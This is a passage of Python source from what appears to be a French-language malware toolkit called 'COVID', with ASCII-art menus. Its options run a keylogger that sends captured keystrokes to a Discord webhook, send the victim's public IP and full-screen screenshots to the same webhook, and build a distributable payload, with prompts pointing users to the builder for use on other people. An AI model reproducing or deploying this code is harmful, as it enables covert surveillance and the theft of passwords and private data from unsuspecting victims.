                ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║     ██║ ╚═══██║
                ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
                ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
                
                1. [KeyLogger]  4. [Build Covid]
                2. [Grabing IP] 5. [Quit]
                3. [ScreenShot]

                    {WHITE}
                Fais ton choix : """)
        except ValueError as e:
            print(f"Error {e}")
        
        if covid == "1":
            try:
                os.system("cls")
                webhook_choice = input(f"""{BLUE}

                ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███  
                ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
                ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
                ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
                ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
                ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
                ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░ 
                ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░     
                ░                      ░        ░                                                  
                            {BLUE}
                Met ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder): """)
            except ValueError as e:
                print(f"Error {e}")

            os.system("cls")

            webhook = webhook_choice

            buffer = ""
            timer = None

            def send_buffer():
                global buffer

                if buffer:
                    data = {
                        "content": buffer,
                        "username": "WhiteWolf",
                        "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                    }

                    requests.post(webhook, json=data)
                    buffer = ""

            def reset_timer():
                global timer
                if timer:
                    timer.cancel()

                timer = threading.Timer(1.0, send_buffer)  
                timer.start()

            def on_press(key):
                global buffer

                try:
                    char = key.char
                    buffer += char

                except AttributeError:
                    if key == keyboard.Key.space:
                        buffer += " "
                    elif key == keyboard.Key.enter:
                        buffer += "\n"
                reset_timer()

            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()
        
        elif covid == "2":
            os.system("cls")
            try:
                ip_grabing = input("""
                     ██████╗ ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██╗██████╗ 
                    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     ██║██╔══██╗
                    ██║  ███╗██████╔╝███████║██████╔╝██║██╔██╗ ██║██║  ███╗    ██║██████╔╝
                    ██║   ██║██╔══██╗██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║    ██║██╔═══╝ 
                    ╚██████╔╝██║  ██║██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝    ██║██║     
                    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝╚═╝     
                        
                    Met Ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder) : """)
            except ValueError as e:
                print(f"Error {e}")
                
            webhook = ip_grabing

            try:
                ip = requests.get("https://checkip.amazonaws.com").text.strip()
             #  print(ip)
                data = {
                    "content": ip,
                    "username": "WhiteWolf",
                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                }
                requests.post(webhook, json=data)
            except ValueError:
                print("Value error")
                time.sleep(3)
        elif covid == "3":
            os.system("cls")
            try:
                screen = input(""" {RED}
                    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
                    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
                    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
                    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
                    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
                    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝
                    Met Ton webhook discord (Pour tester sur des gens autre que vous allez sur le covid builder): """)
            except ValueError as e:
                print(f"Error {e}")

            webhook = screen
            with mss.MSS() as sct:
                img = sct.grab(sct.monitors[1])

                img_bytes = mss.tools.to_png(img.rgb, img.size)

                files = {
                    "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
                }

                requests.post(webhook, data={
                "content": "screenshot", 
                "username": "WhiteWolf", 
                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                }, files=files)
        elif covid == "4":
            try:
                os.system("cls")
                webhook = input(f"""{MAGENTA}
                                                                                
                ██  ██ ██ █████▄  ██  ██ ▄█████   █████▄ ██  ██ ██ ██     ████▄  
                ██▄▄██ ██ ██▄▄██▄ ██  ██ ▀▀▀▄▄▄   ██▄▄██ ██  ██ ██ ██     ██  ██ 
                 ▀██▀  ██ ██   ██ ▀████▀ █████▀   ██▄▄█▀ ▀████▀ ██ ██████ ████▀  
                
                Met Ton Webhook : """)
            except ValueError as e:
                print(f"Error {e}")

            with open("config.json", "w", encoding="utf-8") as f:
                json.dump({"webhook": webhook}, f, ensure_ascii=False, indent=4)
                
            builder()

        elif covid == "5":
            print("Au-Revoir a bientot l'amis")
            time.sleep(2)
            break

    # Ici on a mis le quit si la personne a lancé sans fair expres
    elif choix == "5":
        print("Au-Revoir a bientot l'ami")
        time.sleep(2)
        break
    elif choix == "i":
        show_informations()